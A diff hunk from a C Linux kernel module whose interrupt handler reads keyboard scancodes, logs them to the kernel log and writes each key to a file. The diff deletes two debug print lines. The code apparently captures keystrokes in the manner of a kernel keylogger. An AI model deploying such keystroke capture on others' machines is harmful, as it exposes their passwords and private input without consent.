@@ -37,10 +37,8 @@ irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
 
 	key = (char*) &scancode;
 
-	printk("Not mapped key!\n");
 	printk("Key was: %#2x in hexadecimal\n", scancode);
 	printk("Key was: %d in decimal\n\n", scancode);
-	printk("Key was: %s in decimal\n\n", key);
 
 	file_write(key);
 
